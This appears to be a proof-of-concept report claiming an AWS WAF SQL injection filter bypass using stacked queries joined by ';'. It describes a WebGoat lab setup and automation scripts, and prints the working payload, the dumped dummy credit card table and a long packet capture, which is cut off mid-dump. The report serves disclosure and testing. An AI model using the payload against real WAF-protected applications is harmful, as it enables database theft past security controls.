# Introduction

AWS WAF Documentation for SQlInjectionMatchTuple (https://docs.aws.amazon.com/waf/latest/APIReference/API_SqlInjectionMatchTuple.html#WAF-Type-SqlInjectionMatchTuple-TextTransformation) states that, "Text transformations eliminate some of the unusual formatting that attackers use in web requests in an effort to bypass AWS WAF. If you specify a transformation, AWS WAF performs the transformation on FieldToMatch before inspecting a request for a match."

More specifically, the CMD_LINE TextTransformation will, among other actions, "Replace the following characters with a space: , ;"

Further, with respect to the URL_DECODE xform, one is instructed to, "Use this option to decode a URL-encoded value."

However, it was found that individually, and in combination, both of these xforms fail to prevent injections when two independent queries are concatenated with a ';'.

# SQLi Bypass

Essentially, it was found that by utilizing an injection of the form `EXPECTED_INPUT'; select * from TARGET_TABLE--` the ';' is not properly mitigated (ostensibly by replacing the offending character with whitespace).

# Proof-of-Concept Environment

In order to facilitate reproducibility and ease demonstration, a PoC environment has been provided. It is described using an AWS CloudFormation template (cf/sqli-tsting.yml).

The environment consists of a standalone VPC with a single EC2 instance of OWASP's WebGoat fronted by an ALB protected by a (regional) WAF with SQLi rules defined to demonstrate the bypass found based on the AWS Labs sample (https://github.com/awslabs/aws-waf-sample/tree/master/waf-owasp-top-10)

It was developed and tested using the following:

 * macOS 10.12.6
 * AWS CLI aws-cli/1.14.10 Python/3.6.4 Darwin/16.7.0 botocore/1.8.14 (installed via Homebrew: https://brew.sh/)
 * ubuntu/images/hvm-ssd/ubuntu-trusty-14.04-amd64-server-20171115.1
 * Docker 0.9.1\~dfsg1-2: amd64 armhf i386 (sudo DEBIAN_FRONTEND=noninteractive apt-get install -y docker.io)
 * OWASP WebGoat 7.1 (https://hub.docker.com/r/webgoat/webgoat-7.1/)

## Creating the PoC environment

A deployment script has been included (create.sh) that attempts to determine the reviewer's WAN IP in order to whitelist access from. Should that fail, it will ask the reviewer for their WAN IP directly.

Once the reviewer's WAN IP is decided upon, the stack is provisioned, and the script waits for successful completetion; after which it will output the randomly assigned ALB DNS Name.

The included provisioning script is invoked by running it directly without any arguments. More specifically, `./create.sh`

## Destroing the PoC environment

A clean-up script has been included that will request the deletion of the CloudFormation stack from AWS; waiting for success prior to completion.

It is invoked by running directly without any input or arguments. More specifically, `./destroy.sh`

## Automated Bypass Demonstration

Again, in an attempt to ease reproduction for the reviewer, the found bypass has been codified in the bypass/ directory using Google's puppeteer node library.

It is recommended to start with the "String SQL Injection" lesson described in bypass/ssqli.js. Further, a Bash script (ssqli.sh) has been included that utilizes Docker for maximum portability.

Similar to the previous convenience scripts, it may be invoked without any input or arguments; one simply needs to change into the directory provided and invoking the script directly. More specifically, `cd bypass && ./ssqli.sh`

It was developed and tested using the following:

 * macOS 10.12.6
 * Docker 0.9.1\~dfsg1-2: amd64 armhf i386 (sudo DEBIAN_FRONTEND=noninteractive apt-get install -y docker.io)
 * nodejs v9.4.0
 * GoogleChrome/puppeteer 0.13.0 (https://github.com/GoogleChrome/puppeteer)

NOTES:

 1. puppeteer 1.0.0 was also tested but found to be unstable during QA of this report.
 2. Should the reviewer decide to forgo Docker, the script was also tested by installing puppeteer and invoking directly. More specicially, `cd bypass && npm i puppeteer@0.13.0 && node ssqli.js`
   1. Should the reviewer decide to subsequently attempt to invoke bypass/*.sh (Docker) scripts; the previously install node libraries should be cleaned-up by invoking, `rm -rf node_modules/ package-lock.json`; else one will encounter the following error:
     (node:1) UnhandledPromiseRejectionWarning: Unhandled promise rejection (rejection id: 1): AssertionError [ERR_ASSERTION]: Chromium revision is not downloaded. Run "npm install"

### Numeric Injection

A second PoC has been provided utilizing the "Numeric SQL Injection" lesson. It follows a similar pattern and can be found at bypass/nsqli.*

#  Results

The included WAF SQL match rules will successfully block injections of the form: `EXPECTED_INPUT' select * from TARGET_TABLE--`. Therefore, it is expected that the CMD_LINE transformation would replace the found bypass noted above and properly detect and block the injection with a 403.

## Bypass Achievement

Successfully bypass example

```
$ ./ssqli.sh
logged in to http://WAFTs-WAFTs-1VCWW9KB0COY-1208768243.us-west-2.elb.amazonaws.com/WebGoat
navigating to string SQLi lesson
resetting lesson...JIC
injection submitted
dumping credit card info:
USERID	FIRST_NAME	LAST_NAME	CC_NUMBER	CC_TYPE	COOKIE	LOGIN_COUNT
101	Joe	Snow	987654321	VISA	 	0
101	Joe	Snow	2234200065411	MC	 	0
102	John	Smith	2435600002222	MC	 	0
102	John	Smith	4352209902222	AMEX	 	0
103	Jane	Plane	123456789	MC	 	0
103	Jane	Plane	333498703333	AMEX	 	0
10312	Jolly	Hershey	176896789	MC	 	0
10312	Jolly	Hershey	333300003333	AMEX	 	0
10323	Grumpy	youaretheweakestlink	673834489	MC	 	0
10323	Grumpy	youaretheweakestlink	33413003333	AMEX	 	0
15603	Peter	Sand	123609789	MC	 	0
15603	Peter	Sand	338893453333	AMEX	 	0
15613	Joesph	Something	33843453533	AMEX	 	0
```

One may argue that the ';' is encoded when submitted as `account_name=Smith'%3B+select+*+from+user_data--&SUBMIT=Go!`. However, using BurpSuite the injection was performed after intercept which produces the same bypass; as can be seen by the packet capture taken from the WebGoat host; below:

05:06:13.370495 IP (tos 0x0, ttl 255, id 40896, offset 0, flags [DF], proto TCP (6), length 778)
    192.168.0.238.23847 > 192.168.2.247.http: Flags [P.], cksum 0x7b3f (correct), seq 35077:35803, ack 1149057, win 1856, options [nop,nop,TS val 60693 ecr 52774], length 726: HTTP, length: 726
	POST /WebGoat/attack?Screen=538385464&menu=1100 HTTP/1.1
	X-Forwarded-For: 104.174.159.161
	X-Forwarded-Proto: http
	X-Forwarded-Port: 80
	Host: wafts-wafts-1cx9pvzmvuayb-220624585.us-west-2.elb.amazonaws.com
	X-Amzn-Trace-Id: Root=1-5a66c2c5-4c5ce2a560c832b07eaa0253
	Content-Length: 57
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Content-Type: application/x-www-form-urlencoded; charset=UTF-8
	X-Requested-With: XMLHttpRequest
	Referer: http://wafts-wafts-1cx9pvzmvuayb-220624585.us-west-2.elb.amazonaws.com/WebGoat/start.mvc
	Cookie: JSESSIONID=0425E3DBAEA8260DAD9218E8C519BFF5

	account_name=Smith';+select+*+from+user_data--&SUBMIT=Go![!http]
	0x0000:  0a4d 3dab f800 0ad7 390b 1b22 0800 4500  .M=.....9.."..E.
	0x0010:  030a 9fc0 4000 ff06 53f7 c0a8 00ee c0a8  ....@...S.......
	0x0020:  02f7 5d27 0050 b256 918d ea47 1e9b 8018  ..]'.P.V...G....
	0x0030:  0740 7b3f 0000 0101 080a 0000 ed15 0000  .@{?............
	0x0040:  ce26 504f 5354 202f 5765 6247 6f61 742f  .&POST./WebGoat/
	0x0050:  6174 7461 636b 3f53 6372 6565 6e3d 3533  attack?Screen=53
	0x0060:  3833 3835 3436 3426 6d65 6e75 3d31 3130  8385464&menu=110
	0x0070:  3020 4854 5450 2f31 2e31 0d0a 582d 466f  0.HTTP/1.1..X-Fo
	0x0080:  7277 6172 6465 642d 466f 723a 2031 3034  rwarded-For:.104
	0x0090:  2e31 3734 2e31 3539 2e31 3631 0d0a 582d  .174.159.161..X-
	0x00a0:  466f 7277 6172 6465 642d 5072 6f74 6f3a  Forwarded-Proto:
	0x00b0:  2068 7474 700d 0a58 2d46 6f72 7761 7264  .http..X-Forward
	0x00c0:  6564 2d50 6f72 743a 2038 300d 0a48 6f73  ed-Port:.80..Hos
	0x00d0:  743a 2077 6166 7473 2d77 6166 7473 2d31  t:.wafts-wafts-1
	0x00e0:  6378 3970 767a 6d76 7561 7962 2d32 3230  cx9pvzmvuayb-220
	0x00f0:  3632 3435 3835 2e75 732d 7765 7374 2d32  624585.us-west-2
	0x0100:  2e65 6c62 2e61 6d61 7a6f 6e61 7773 2e63  .elb.amazonaws.c
	0x0110:  6f6d 0d0a 582d 416d 7a6e 2d54 7261 6365  om..X-Amzn-Trace
	0x0120:  2d49 643a 2052 6f6f 743d 312d 3561 3636  -Id:.Root=1-5a66
	0x0130:  6332 6335 2d34 6335 6365 3261 3536 3063  c2c5-4c5ce2a560c
	0x0140:  3833 3262 3037 6561 6130 3235 330d 0a43  832b07eaa0253..C
	0x0150:  6f6e 7465 6e74 2d4c 656e 6774 683a 2035  ontent-Length:.5
	0x0160:  370d 0a55 7365 722d 4167 656e 743a 204d  7..User-Agent:.M
	0x0170:  6f7a 696c 6c61 2f35 2e30 2028 5831 313b  ozilla/5.0.(X11;
	0x0180:  204c 696e 7578 2078 3836 5f36 343b 2072  .Linux.x86_64;.r
	0x0190:  763a 3435 2e30 2920 4765 636b 6f2f 3230  v:45.0).Gecko/20
	0x01a0:  3130 3031 3031 2046 6972 6566 6f78 2f34  100101.Firefox/4
	0x01b0:  352e 300d 0a41 6363 6570 743a 202a 2f2a  5.0..Accept:.*/*
	0x01c0:  0d0a 4163 6365 7074 2d4c 616e 6775 6167  ..Accept-Languag
	0x01d0:  653a 2065 6e2d 5553 2c65 6e3b 713d 302e  e:.en-US,en;q=0.
	0x01e0:  350d 0a43 6f6e 7465 6e74 2d54 7970 653a  5..Content-Type:
	0x01f0:  2061 7070 6c69 6361 7469 6f6e 2f78 2d77  .application/x-w
	0x0200:  7777 2d66 6f72 6d2d 7572 6c65 6e63 6f64  ww-form-urlencod
	0x0210:  6564 3b20 6368 6172 7365 743d 5554 462d  ed;.charset=UTF-
	0x0220:  380d 0a58 2d52 6571 7565 7374 6564 2d57  8..X-Requested-W
	0x0230:  6974 683a 2058 4d4c 4874 7470 5265 7175  ith:.XMLHttpRequ
	0x0240:  6573 740d 0a52 6566 6572 6572 3a20 6874  est..Referer:.ht
	0x0250:  7470 3a2f 2f77 6166 7473 2d77 6166 7473  tp://wafts-wafts
	0x0260:  2d31 6378 3970 767a 6d76 7561 7962 2d32  -1cx9pvzmvuayb-2
	0x0270:  3230 3632 3435 3835 2e75 732d 7765 7374  20624585.us-west
	0x0280:  2d32 2e65 6c62 2e61 6d61 7a6f 6e61 7773  -2.elb.amazonaws
	0x0290:  2e63 6f6d 2f57 6562 476f 6174 2f73 7461  .com/WebGoat/sta
	0x02a0:  7274 2e6d 7663 0d0a 436f 6f6b 6965 3a20  rt.mvc..Cookie:.
	0x02b0:  4a53 4553 5349 4f4e 4944 3d30 3432 3545  JSESSIONID=0425E
	0x02c0:  3344 4241 4541 3832 3630 4441 4439 3231  3DBAEA8260DAD921
	0x02d0:  3845 3843 3531 3942 4646 350d 0a0d 0a61  8E8C519BFF5....a
	0x02e0:  6363 6f75 6e74 5f6e 616d 653d 536d 6974  ccount_name=Smit
	0x02f0:  6827 3b2b 7365 6c65 6374 2b2a 2b66 726f  h';+select+*+fro
	0x0300:  6d2b 7573 6572 5f64 6174 612d 2d26 5355  m+user_data--&SU
	0x0310:  424d 4954 3d47 6f21                      BMIT=Go!
05:06:13.410060 IP (tos 0x0, ttl 63, id 4841, offset 0, flags [DF], proto TCP (6), length 52)
    192.168.2.247.http > 192.168.0.238.23847: Flags [.], cksum 0x855c (incorrect -> 0x644d), seq 1149057, ack 35803, win 840, options [nop,nop,TS val 61383 ecr 60693], length 0
	0x0000:  0ad7 390b 1b22 0a4d 3dab f800 0800 4500  ..9..".M=.....E.
	0x0010:  0034 12e9 4000 3f06 a3a5 c0a8 02f7 c0a8  .4..@.?.........
	0x0020:  00ee 0050 5d27 ea47 1e9b b256 9463 8010  ...P]'.G...V.c..
	0x0030:  0348 855c 0000 0101 080a 0000 efc7 0000  .H.\............
	0x0040:  ed15                                     ..
05:06:13.464173 IP (tos 0x0, ttl 63, id 4842, offset 0, flags [DF], proto TCP (6), length 2948)
    192.168.2.247.http > 192.168.0.238.23847: Flags [.], cksum 0x90ac (incorrect -> 0x3c8a), seq 1149057:1151953, ack 35803, win 840, options [nop,nop,TS val 61397 ecr 60693], length 2896: HTTP, length: 2896
	HTTP/1.1 200 OK
	Server: Apache-Coyote/1.1
	Content-Type: text/html;charset=ISO-8859-1
	Content-Length: 3259
	Date: Tue, 23 Jan 2018 05:06:13 GMT






	<!-- HTML fragment correpsonding to the lesson content -->


	<div id="lessonContent">

	    SQL injection attacks represent a serious threat to any database-driven site. The methods behind an attack are easy to learn and the damage caused can range from considerable to complete system compromise. Despite these risks, an incredible number of systems on the internet are susceptible to this form of attack.
	<br><br>
	Not only is it a threat easily instigated, it is also a threat that, with a little common-sense and forethought, can easily be prevented.<br>
	<br>
	It is always good practice to sanitize all input data, especially data that will used in OS command, scripts, and database queries, even if the threat of SQL injection has been prevented in some other manner.<br>
	<p><b>General Goal(s):</b> </p>
	The form below allows a user to view their credit card numbers. Try to inject an SQL string that results in all the credit card numbers being displayed. Try the user name of 'Smith'.
	</div>
	<div id="message" class="info"><BR> * Now that you have successfully performed an SQL injection, try the same type of attack on a parameterized query.  Restart the lesson if you wish to return to the injectable query.</div>


	<div id="lessonContent"><form accept-charset='UNKNOWN' method='POST' name='form' action='#attack/538385464/1100' enctype=''><p>Enter your last name:<input name='account_name' type='TEXT' value="Smith'; select * from user_data--"><input name='SUBMIT' type='SUBMIT' value='Go!'><pre>SELECT * FROM user_data WHERE last_name = 'Smith'; select * from user_data--'</pre><table cellpadding='1' border='1'><tr><td><b>USERID</b></td><td><b>FIRST_NAME</b></td><td><b>LAST_NAME</b></td><td><b>CC_NUMBER</b></td><td><b>CC_TYPE</b></td><td><b>COOKIE</b></td><td><b>LOGIN_COUNT</b></td></tr><tr><td>101</td><td>Joe</td><td>Snow</td><td>987654321</td><td>VISA</td><td>&nbsp;</td><td>0</td></tr><tr><td>101</td><td>Joe</td><td>Snow</td><td>2234200065411</td><td>MC</td><td>&nbsp;</td><td>0</td></tr><tr><td>102</td><td>John</td><td>Smith</td><td>2435600002222</td><td>MC</td><td>&nbsp;</td><td>0</td></tr><tr><td>102</td><td>John</td><td>Smith</td><td>4352209902222</td><td>AMEX</td><td>&nbsp;</td><td>0</td></tr><tr><td>103</td><td>Jane</td><td>Plane</td><td>123456789</td><td>MC</td><td>&nbsp;</td><td>0</td></tr><tr><td>103</td><td>Jane</td><td>Plane</td><td>333498703333</td><td>AMEX</td><td>&nbsp;</td><td>0</td></tr><tr><td>10312</td><td>Jolly</td><td>Hershey</td><td>176896789</td><td>MC</td><td>&nbsp;</td><td>0</td></tr><tr><td>10312</td><td>Jolly</td><td>Hershey</td><td>333300003333</td><td>AMEX</td><td>&nbsp;</td><td>0</td></tr><tr><td>10323</td><td>Grumpy</td><td>youaretheweakestlink</td><td>673834489</td><td>MC</td[!http]
	0x0000:  0ad7 390b 1b22 0a4d 3dab f800 0800 4500  ..9..".M=.....E.
	0x0010:  0b84 12ea 4000 3f06 9854 c0a8 02f7 c0a8  ....@.?..T......
	0x0020:  00ee 0050 5d27 ea47 1e9b b256 9463 8010  ...P]'.G...V.c..
	0x0030:  0348 90ac 0000 0101 080a 0000 efd5 0000  .H..............
	0x0040:  ed15 4854 5450 2f31 2e31 2032 3030 204f  ..HTTP/1.1.200.O
	0x0050:  4b0d 0a53 6572 7665 723a 2041 7061 6368  K..Server:.Apach
	0x0060:  652d 436f 796f 7465 2f31 2e31 0d0a 436f  e-Coyote/1.1..Co
	0x0070:  6e74 656e 742d 5479 7065 3a20 7465 7874  ntent-Type:.text
	0x0080:  2f68 746d 6c3b 6368 6172 7365 743d 4953  /html;charset=IS
	0x0090:  4f2d 3838 3539 2d31 0d0a 436f 6e74 656e  O-8859-1..Conten
	0x00a0:  742d 4c65 6e67 7468 3a20 3332 3539 0d0a  t-Length:.3259..
	0x00b0:  4461 7465 3a20 5475 652c 2032 3320 4a61  Date:.Tue,.23.Ja
	0x00c0:  6e20 3230 3138 2030 353a 3036 3a31 3320  n.2018.05:06:13.
	0x00d0:  474d 540d 0a0d 0a0a 0a0a 0a0a 3c21 2d2d  GMT.........<!--
	0x00e0:  2048 544d 4c20 6672 6167 6d65 6e74 2063  .HTML.fragment.c
	0x00f0:  6f72 7265 7073 6f6e 6469 6e67 2074 6f20  orrepsonding.to.
	0x0100:  7468 6520 6c65 7373 6f6e 2063 6f6e 7465  the.lesson.conte
	0x0110:  6e74 202d 2d3e 0a0a 0a3c 6469 7620 6964  nt.-->...<div.id
	0x0120:  3d22 6c65 7373 6f6e 436f 6e74 656e 7422  ="lessonContent"
	0x0130:  3e0a 2020 2020 0a20 2020 2053 514c 2069  >..........SQL.i
	0x0140:  6e6a 6563 7469 6f6e 2061 7474 6163 6b73  njection.attacks
	0x0150:  2072 6570 7265 7365 6e74 2061 2073 6572  .represent.a.ser
	0x0160:  696f 7573 2074 6872 6561 7420 746f 2061  ious.threat.to.a
	0x0170:  6e79 2064 6174 6162 6173 652d 6472 6976  ny.database-driv
	0x0180:  656e 2073 6974 652e 2054 6865 206d 6574  en.site..The.met
	0x0190:  686f 6473 2062 6568 696e 6420 616e 2061  hods.behind.an.a
	0x01a0:  7474 6163 6b20 6172 6520 6561 7379 2074  ttack.are.easy.t
	0x01b0:  6f20 6c65 6172 6e20 616e 6420 7468 6520  o.learn.and.the.
	0x01c0:  6461 6d61 6765 2063 6175 7365 6420 6361  damage.caused.ca
	0x01d0:  6e20 7261 6e67 6520 6672 6f6d 2063 6f6e  n.range.from.con
	0x01e0:  7369 6465 7261 626c 6520 746f 2063 6f6d  siderable.to.com
	0x01f0:  706c 6574 6520 7379 7374 656d 2063 6f6d  plete.system.com
	0x0200:  7072 6f6d 6973 652e 2044 6573 7069 7465  promise..Despite
	0x0210:  2074 6865 7365 2072 6973 6b73 2c20 616e  .these.risks,.an
	0x0220:  2069 6e63 7265 6469 626c 6520 6e75 6d62  .incredible.numb
	0x0230:  6572 206f 6620 7379 7374 656d 7320 6f6e  er.of.systems.on
	0x0240:  2074 6865 2069 6e74 6572 6e65 7420 6172  .the.internet.ar
	0x0250:  6520 7375 7363 6570 7469 626c 6520 746f  e.susceptible.to
	0x0260:  2074 6869 7320 666f 726d 206f 6620 6174  .this.form.of.at
	0x0270:  7461 636b 2e0a 3c62 723e 3c62 723e 0a4e  tack..<br><br>.N
	0x0280:  6f74 206f 6e6c 7920 6973 2069 7420 6120  ot.only.is.it.a.
	0x0290:  7468 7265 6174 2065 6173 696c 7920 696e  threat.easily.in
	0x02a0:  7374 6967 6174 6564 2c20 6974 2069 7320  stigated,.it.is.
	0x02b0:  616c 736f 2061 2074 6872 6561 7420 7468  also.a.threat.th
	0x02c0:  6174 2c20 7769 7468 2061 206c 6974 746c  at,.with.a.littl
	0x02d0:  6520 636f 6d6d 6f6e 2d73 656e 7365 2061  e.common-sense.a
	0x02e0:  6e64 2066 6f72 6574 686f 7567 6874 2c20  nd.forethought,.
	0x02f0:  6361 6e20 6561 7369 6c79 2062 6520 7072  can.easily.be.pr
	0x0300:  6576 656e 7465 642e 3c62 723e 0a3c 6272  evented.<br>.<br
	0x0310:  3e0a 4974 2069 7320 616c 7761 7973 2067  >.It.is.always.g
	0x0320:  6f6f 6420 7072 6163 7469 6365 2074 6f20  ood.practice.to.
	0x0330:  7361 6e69 7469 7a65 2061 6c6c 2069 6e70  sanitize.all.inp
	0x0340:  7574 2064 6174 612c 2065 7370 6563 6961  ut.data,.especia
	0x0350:  6c6c 7920 6461 7461 2074 6861 7420 7769  lly.data.that.wi
	0x0360:  6c6c 2075 7365 6420 696e 204f 5320 636f  ll.used.in.OS.co
	0x0370:  6d6d 616e 642c 2073 6372 6970 7473 2c20  mmand,.scripts,.
	0x0380:  616e 6420 6461 7461 6261 7365 2071 7565  and.database.que
	0x0390:  7269 6573 2c20 6576 656e 2069 6620 7468  ries,.even.if.th
	0x03a0:  6520 7468 7265 6174 206f 6620 5351 4c20  e.threat.of.SQL.
	0x03b0:  696e 6a65 6374 696f 6e20 6861 7320 6265  injection.has.be
	0x03c0:  656e 2070 7265 7665 6e74 6564 2069 6e20  en.prevented.in.
	0x03d0:  736f 6d65 206f 7468 6572 206d 616e 6e65  some.other.manne
	0x03e0:  722e 3c62 723e 0a3c 703e 3c62 3e47 656e  r.<br>.<p><b>Gen
	0x03f0:  6572 616c 2047 6f61 6c28 7329 3a3c 2f62  eral.Goal(s):</b
	0x0400:  3e20 3c2f 703e 0a54 6865 2066 6f72 6d20  >.</p>.The.form.
	0x0410:  6265 6c6f 7720 616c 6c6f 7773 2061 2075  below.allows.a.u
	0x0420:  7365 7220 746f 2076 6965 7720 7468 6569  ser.to.view.thei
	0x0430:  7220 6372 6564 6974 2063 6172 6420 6e75  r.credit.card.nu
	0x0440:  6d62 6572 732e 2054 7279 2074 6f20 696e  mbers..Try.to.in
	0x0450:  6a65 6374 2061 6e20 5351 4c20 7374 7269  ject.an.SQL.stri
	0x0460:  6e67 2074 6861 7420 7265 7375 6c74 7320  ng.that.results.
	0x0470:  696e 2061 6c6c 2074 6865 2063 7265 6469  in.all.the.credi
	0x0480:  7420 6361 7264 206e 756d 6265 7273 2062  t.card.numbers.b
	0x0490:  6569 6e67 2064 6973 706c 6179 6564 2e20  eing.displayed..
	0x04a0:  5472 7920 7468 6520 7573 6572 206e 616d  Try.the.user.nam
	0x04b0:  6520 6f66 2027 536d 6974 6827 2e0a 3c2f  e.of.'Smith'..</
	0x04c0:  6469 763e 0a3c 6469 7620 6964 3d22 6d65  div>.<div.id="me
	0x04d0:  7373 6167 6522 2063 6c61 7373 3d22 696e  ssage".class="in
	0x04e0:  666f 223e 3c42 523e 202a 204e 6f77 2074  fo"><BR>.*.Now.t
	0x04f0:  6861 7420 796f 7520 6861 7665 2073 7563  hat.you.have.suc
	0x0500:  6365 7373 6675 6c6c 7920 7065 7266 6f72  cessfully.perfor
	0x0510:  6d65 6420 616e 2053 514c 2069 6e6a 6563  med.an.SQL.injec
	0x0520:  7469 6f6e 2c20 7472 7920 7468 6520 7361  tion,.try.the.sa
	0x0530:  6d65 2074 7970 6520 6f66 2061 7474 6163  me.type.of.attac
	0x0540:  6b20 6f6e 2061 2070 6172 616d 6574 6572  k.on.a.parameter
	0x0550:  697a 6564 2071 7565 7279 2e20 2052 6573  ized.query...Res
	0x0560:  7461 7274 2074 6865 206c 6573 736f 6e20  tart.the.lesson.
	0x0570:  6966 2079 6f75 2077 6973 6820 746f 2072  if.you.wish.to.r
	0x0580:  6574 7572 6e20 746f 2074 6865 2069 6e6a  eturn.to.the.inj
	0x0590:  6563 7461 626c 6520 7175 6572 792e 3c2f  ectable.query.</
	0x05a0:  6469 763e 0a0a 0a3c 6469 7620 6964 3d22  div>...<div.id="
	0x05b0:  6c65 7373 6f6e 436f 6e74 656e 7422 3e3c  lessonContent"><
	0x05c0:  666f 726d 2061 6363 6570 742d 6368 6172  form.accept-char
	0x05d0:  7365 743d 2755 4e4b 4e4f 574e 2720 6d65  set='UNKNOWN'.me
	0x05e0:  7468 6f64 3d27 504f 5354 2720 6e61 6d65  thod='POST'.name
	0x05f0:  3d27 666f 726d 2720 6163 7469 6f6e 3d27  ='form'.action='
	0x0600:  2361 7474 6163 6b2f 3533 3833 3835 3436  #attack/53838546
	0x0610:  342f 3131 3030 2720 656e 6374 7970 653d  4/1100'.enctype=
	0x0620:  2727 3e3c 703e 456e 7465 7220 796f 7572  ''><p>Enter.your
	0x0630:  206c 6173 7420 6e61 6d65 3a3c 696e 7075  .last.name:<inpu
	0x0640:  7420 6e61 6d65 3d27 6163 636f 756e 745f  t.name='account_
	0x0650:  6e61 6d65 2720 7479 7065 3d27 5445 5854  name'.type='TEXT
	0x0660:  2720 7661 6c75 653d 2253 6d69 7468 273b  '.value="Smith';
	0x0670:  2073 656c 6563 7420 2a20 6672 6f6d 2075  .select.*.from.u
	0x0680:  7365 725f 6461 7461 2d2d 223e 3c69 6e70  ser_data--"><inp
	0x0690:  7574 206e 616d 653d 2753 5542 4d49 5427  ut.name='SUBMIT'
	0x06a0:  2074 7970 653d 2753 5542 4d49 5427 2076  .type='SUBMIT'.v
	0x06b0:  616c 7565 3d27 476f 2127 3e3c 7072 653e  alue='Go!'><pre>
	0x06c0:  5345 4c45 4354 202a 2046 524f 4d20 7573  SELECT.*.FROM.us
	0x06d0:  6572 5f64 6174 6120 5748 4552 4520 6c61  er_data.WHERE.la
	0x06e0:  7374 5f6e 616d 6520 3d20 2753 6d69 7468  st_name.=.'Smith
	0x06f0:  273b 2073 656c 6563 7420 2a20 6672 6f6d  ';.select.*.from
	0x0700:  2075 7365 725f 6461 7461 2d2d 273c 2f70  .user_data--'</p
	0x0710:  7265 3e3c 7461 626c 6520 6365 6c6c 7061  re><table.cellpa
	0x0720:  6464 696e 673d 2731 2720 626f 7264 6572  dding='1'.border
	0x0730:  3d27 3127 3e3c 7472 3e3c 7464 3e3c 623e  ='1'><tr><td><b>
	0x0740:  5553 4552 4944 3c2f 623e 3c2f 7464 3e3c  USERID</b></td><
	0x0750:  7464 3e3c 623e 4649 5253 545f 4e41 4d45  td><b>FIRST_NAME
	0x0760:  3c2f 623e 3c2f 7464 3e3c 7464 3e3c 623e  </b></td><td><b>
	0x0770:  4c41 5354 5f4e 414d 453c 2f62 3e3c 2f74  LAST_NAME</b></t
	0x0780:  643e 3c74 643e 3c62 3e43 435f 4e55 4d42  d><td><b>CC_NUMB
	0x0790:  4552 3c2f 623e 3c2f 7464 3e3c 7464 3e3c  ER</b></td><td><
	0x07a0:  623e 4343 5f54 5950 453c 2f62 3e3c 2f74  b>CC_TYPE</b></t
	0x07b0:  643e 3c74 643e 3c62 3e43 4f4f 4b49 453c  d><td><b>COOKIE<
	0x07c0:  2f62 3e3c 2f74 643e 3c74 643e 3c62 3e4c  /b></td><td><b>L
	0x07d0:  4f47 494e 5f43 4f55 4e54 3c2f 623e 3c2f  OGIN_COUNT</b></
	0x07e0:  7464 3e3c 2f74 723e 3c74 723e 3c74 643e  td></tr><tr><td>
	0x07f0:  3130 313c 2f74 643e 3c74 643e 4a6f 653c  101</td><td>Joe<
	0x0800:  2f74 643e 3c74 643e 536e 6f77 3c2f 7464  /td><td>Snow</td
	0x0810:  3e3c 7464 3e39 3837 3635 3433 3231 3c2f  ><td>987654321</
	0x0820:  7464 3e3c 7464 3e56 4953 413c 2f74 643e  td><td>VISA</td>
	0x0830:  3c74 643e 266e 6273 703b 3c2f 7464 3e3c  <td>&nbsp;</td><
	0x0840:  7464 3e30 3c2f 7464 3e3c 2f74 723e 3c74  td>0</td></tr><t
	0x0850:  723e 3c74 643e 3130 313c 2f74 643e 3c74  r><td>101</td><t
	0x0860:  643e 4a6f 653c 2f74 643e 3c74 643e 536e  d>Joe</td><td>Sn
	0x0870:  6f77 3c2f 7464 3e3c 7464 3e32 3233 3432  ow</td><td>22342
	0x0880:  3030 3036 3534 3131 3c2f 7464 3e3c 7464  00065411</td><td
	0x0890:  3e4d 433c 2f74 643e 3c74 643e 266e 6273  >MC</td><td>&nbs
	0x08a0:  703b 3c2f 7464 3e3c 7464 3e30 3c2f 7464  p;</td><td>0</td
	0x08b0:  3e3c 2f74 723e 3c74 723e 3c74 643e 3130  ></tr><tr><td>10
	0x08c0:  323c 2f74 643e 3c74 643e 4a6f 686e 3c2f  2</td><td>John</
	0x08d0:  7464 3e3c 7464 3e53 6d69 7468 3c2f 7464  td><td>Smith</td
	0x08e0:  3e3c 7464 3e32 3433 3536 3030 3030 3232  ><td>24356000022
	0x08f0:  3232 3c2f 7464 3e3c 7464 3e4d 433c 2f74  22</td><td>MC</t
	0x0900:  643e 3c74 643e 266e 6273 703b 3c2f 7464  d><td>&nbsp;</td
	0x0910:  3e3c 7464 3e30 3c2f 7464 3e3c 2f74 723e  ><td>0</td></tr>
	0x0920:  3c74 723e 3c74 643e 3130 323c 2f74 643e  <tr><td>102</td>
	0x0930:  3c74 643e 4a6f 686e 3c2f 7464 3e3c 7464  <td>John</td><td
	0x0940:  3e53 6d69 7468 3c2f 7464 3e3c 7464 3e34  >Smith</td><td>4
	0x0950:  3335 3232 3039 3930 3232 3232 3c2f 7464  352209902222</td
	0x0960:  3e3c 7464 3e41 4d45 583c 2f74 643e 3c74  ><td>AMEX</td><t
	0x0970:  643e 266e 6273 703b 3c2f 7464 3e3c 7464  d>&nbsp;</td><td
	0x0980:  3e30 3c2f 7464 3e3c 2f74 723e 3c74 723e  >0</td></tr><tr>
	0x0990:  3c74 643e 3130 333c 2f74 643e 3c74 643e  <td>103</td><td>
	0x09a0:  4a61 6e65 3c2f 7464 3e3c 7464 3e50 6c61  Jane</td><td>Pla
	0x09b0:  6e65 3c2f 7464 3e3c 7464 3e31 3233 3435  ne</td><td>12345
	0x09c0:  3637 3839 3c2f 7464 3e3c 7464 3e4d 433c  6789</td><td>MC<
	0x09d0:  2f74 643e 3c74 643e 266e 6273 703b 3c2f  /td><td>&nbsp;</
	0x09e0:  7464 3e3c 7464 3e30 3c2f 7464 3e3c 2f74  td><td>0</td></t
	0x09f0:  723e 3c74 723e 3c74 643e 3130 333c 2f74  r><tr><td>103</t
	0x0a00:  643e 3c74 643e 4a61 6e65 3c2f 7464 3e3c  d><td>Jane</td><
	0x0a10:  7464 3e50 6c61 6e65 3c2f 7464 3e3c 7464  td>Plane</td><td
	0x0a20:  3e33 3333 3439 3837 3033 3333 333c 2f74  >333498703333</t
	0x0a30:  643e 3c74 643e 414d 4558 3c2f 7464 3e3c  d><td>AMEX</td><
	0x0a40:  7464 3e26 6e62 7370 3b3c 2f74 643e 3c74  td>&nbsp;</td><t
	0x0a50:  643e 303c 2f74 643e 3c2f 7472 3e3c 7472  d>0</td></tr><tr
	0x0a60:  3e3c 7464 3e31 3033 3132 3c2f 7464 3e3c  ><td>10312</td><
	0x0a70:  7464 3e4a 6f6c 6c79 3c2f 7464 3e3c 7464  td>Jolly</td><td
	0x0a80:  3e48 6572 7368 6579 3c2f 7464 3e3c 7464  >Hershey</td><td
